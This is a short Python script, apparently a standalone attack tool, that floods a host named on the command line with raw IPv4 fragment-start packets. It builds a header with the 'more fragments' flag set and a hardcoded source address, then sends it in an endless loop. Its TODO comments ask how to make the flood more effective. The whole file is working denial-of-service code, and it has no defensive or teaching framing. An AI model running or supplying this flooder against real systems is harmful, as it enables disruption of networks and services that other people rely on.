#!/usr/bin/env python3

import argparse
import socket
import sys
import struct


def mk_parser():
    parser = argparse.ArgumentParser(
        description='Floods the target host with the start of IPv4 fragments')
    parser.add_argument('host', help='The host to send packets to')
    return parser


def mk_sock():
    try:
        sock = socket.socket(
            socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        return sock
    except socket.error as e:
        print(f"Could not create socket: {e}")
        sys.exit(1)


def mk_header(src_ip, dst_ip):
    # Header Length = 5 bytes (no extra options)
    ihl = 5
    # IPv4
    ver = 4
    # Type of service
    # TODO: could this be urgent/critical?
    tos = 0
    # Handled by OS
    tot_len = 0
    # Unique packet ID
    # TODO: does it help to randomize this? or is that extra computational burden
    ident = 12345
    # Flags | Offset
    # > Sets the "more fragments" bit
    frag_off = 1 << 13
    ttl = 255
    proto = socket.IPPROTO_TCP
    # Handled by OS
    check = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    # Make this a byte
    ihl_ver = (ver << 4) + ihl

    return struct.pack(
        '!BBHHHBBH4s4s',
        ihl_ver, tos, tot_len, ident, frag_off, ttl, proto, check, src, dst)


def main():
    args = mk_parser().parse_args()
    target = args.host
    src = '10.0.0.211'
    header = mk_header(src, target)
    sock = mk_sock()
    try:
        while True:
            sock.sendto(header, (target, 0))
    except KeyboardInterrupt:
        ...


if __name__ == '__main__':
    main()
